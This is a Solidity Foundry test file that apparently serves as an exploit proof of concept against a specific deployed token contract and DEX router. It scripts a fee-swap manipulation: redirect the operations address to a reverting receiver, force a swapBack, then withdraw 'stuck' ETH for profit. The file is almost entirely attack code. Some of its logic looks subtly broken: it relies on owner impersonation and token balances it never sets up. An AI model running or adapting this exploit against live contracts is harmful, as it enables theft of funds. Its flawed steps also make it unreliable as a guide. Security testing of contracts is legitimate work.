pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256, uint256, uint256);
}

interface FoundationToken {
    function setOperationsAddress(address _operationsAddress) external;
    function forceSwapBack() external;
    function withdrawStuckETH() external;
    function swapTokensAtAmount() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function enableTrading() external;
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

contract RevertingReceiver {
    receive() external payable {
        revert("ETH reception reverted");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    IDexRouter public router = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    RevertingReceiver public revertingReceiver;
    FoundationToken public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = FoundationToken(TARGET);
        revertingReceiver = new RevertingReceiver();

        // Grant the attacker ETH and provide initial liquidity to the DEX pair.
        deal(attacker, 100 ether);
        uint256 liquidityTokens = 10_000_000_000_000 * 1e18;
        vm.prank(target.owner());
        target.approve(address(router), liquidityTokens);

        vm.prank(attacker);
        router.addLiquidityETH{value: 50 ether}(
            address(target),
            liquidityTokens,
            0,
            0,
            attacker,
            block.timestamp
        );

        // Enable trading to allow fee collection and swaps.
        vm.prank(target.owner());
        target.enableTrading();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        vm.startPrank(target.owner());

        // 1. As owner, set the operationsAddress to our malicious contract.
        target.setOperationsAddress(address(revertingReceiver));

        // 2. Accumulate tokens in the contract by triggering sell fees through a swap.
        uint256 swapTokensAtAmount = target.swapTokensAtAmount();
        // A sale of 20x the swap threshold will generate sufficient fees.
        uint256 amountToSell = swapTokensAtAmount * 20;

        vm.stopPrank();

        vm.prank(attacker);
        target.approve(address(router), amountToSell);

        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = router.WETH();

        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSell,
            0, 
            path, 
            attacker, 
            block.timestamp
        );

        assertTrue(target.balanceOf(address(target)) >= swapTokensAtAmount, "Contract failed to accumulate enough tokens from fees.");

        vm.startPrank(target.owner());

        // 3. Trigger swapBack, which swaps tokens for ETH but fails to transfer them.
        target.forceSwapBack();

        // 4. Withdraw the stuck ETH to the attacker's address.
        target.withdrawStuckETH();

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

